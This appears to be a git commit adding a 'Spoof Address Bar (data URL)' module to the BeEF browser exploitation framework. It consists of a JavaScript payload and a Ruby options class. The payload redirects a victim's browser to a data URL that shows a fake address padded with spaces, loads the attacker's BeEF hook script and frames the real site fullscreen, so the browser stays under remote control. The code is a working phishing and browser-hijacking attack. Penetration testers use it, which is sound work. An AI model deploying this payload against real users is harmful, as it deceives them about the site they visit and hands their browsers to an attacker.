e5f6ff3b11b715f06a42f3cb84ec92146daba4bc
Brendan Coles <bcoles@gmail.com>
2017-01-16 11:07:00 +0000

    Add 'Spoof Address Bar (data URL)' module

---
+++ modules/social_engineering/spoof_addressbar_data/command.js
@@ -0,0 +1,19 @@
+//
+// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+beef.execute(function() {
+
+  var hook = beef.net.httpproto + "://" + beef.net.host + ":" + beef.net.port + beef.net.hook;
+
+  try {
+    window.location = "data:text/html,<%= @spoofed_url %><%= ' '*1337 %>?<script src='"+hook+"'></script><script>document.title='<%= @spoofed_url %>';beef.dom.createIframe('fullscreen',{'src':'<%= @real_url %>'},{},null);</script>"
+    beef.debug("[Spoof Address Bar (data)] Redirecting to data URL...");
+  } catch (e) {
+    beef.debug("[Spoof Address Bar (data)] could not redirect: "+e.message)
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=something went horribly wrong: " + e.message, beef.are.status_error());
+  }
+
+});
---
+++ modules/social_engineering/spoof_addressbar_data/module.rb
@@ -0,0 +1,18 @@
+#
+# Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+class Spoof_addressbar_data < BeEF::Core::Command
+
+  def self.options
+    [
+      {'name' => 'spoofed_url', 'ui_label' => 'Spoofed URL', 'type' => 'text', 'value' => 'https://example.com/'},
+      {'name' => 'real_url', 'ui_label' => 'Real URL', 'type' => 'text', 'value' => 'https://example.com/'}
+    ]
+  end
+
+  def post_execute
+    save({'result' => @datastore['result']})
+  end
+end
